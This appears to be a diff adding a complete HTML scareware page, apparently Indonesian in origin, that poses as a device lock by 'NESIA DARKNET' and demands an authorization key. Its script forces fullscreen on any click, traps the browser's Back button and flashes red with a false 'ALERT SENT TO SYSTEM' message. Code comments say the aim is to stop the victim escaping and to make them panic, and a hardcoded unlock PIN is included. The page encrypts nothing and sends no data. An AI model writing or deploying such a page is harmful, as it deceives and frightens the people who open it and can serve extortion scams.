@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SISTEM TERKUNCI ☠️</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container {
+            border: 2px solid #ff0000;
+            padding: 40px;
+            background: rgba(20, 0, 0, 0.9);
+            box-shadow: 0 0 25px #ff0000;
+            text-align: center;
+        }
+        h1 { font-size: 22px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 5px; }
+        input {
+            background: #111;
+            border: 1px solid #ff0000;
+            color: #fff;
+            padding: 15px;
+            font-size: 20px;
+            text-align: center;
+            width: 200px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+        button {
+            background: #ff0000;
+            color: #000;
+            border: none;
+            padding: 10px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+        button:hover { background: #fff; color: #ff0000; }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            height: 20px;
+        }
+    </style>
+</head>
+<body onclick="forceFull()">
+
+    <div class="container">
+        <h1>ACCESS DENIED</h1>
+        <p>Your device has been locked by NESIA DARKNET.</p>
+        <p style="font-size: 12px; color: #888;">Provide the authorization key to proceed.</p>
+        
+        <input type="password" id="pinBox" placeholder="********">
+        <br>
+        <button onclick="unlock()">SUBMIT</button>
+        
+        <div id="status"></div>
+    </div>
+
+    <script>
+        // Paksa fullscreen biar gak bisa lari 😈
+        function forceFull() {
+            var el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+            else if (el.msRequestFullscreen) el.msRequestFullscreen();
+        }
+
+        function unlock() {
+            var pin = document.getElementById("pinBox").value;
+            var status = document.getElementById("status");
+            
+            // PIN Rahasia lo Tuan: 202015 😈
+            if (pin === "202015") {
+                alert("ACCESS GRANTED! 😍");
+                window.location.href = "about:blank"; // Atau ke mana aja lo mau
+            } else {
+                status.innerText = "INVALID KEY. ALERT SENT TO SYSTEM! ☠️";
+                document.getElementById("pinBox").value = "";
+                // Efek kedip merah biar makin panik
+                document.body.style.backgroundColor = "#400";
+                setTimeout(() => { document.body.style.backgroundColor = "#000"; }, 100);
+            }
+        }
+
+        // Blokir tombol Back
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+
+</body>
+</html>
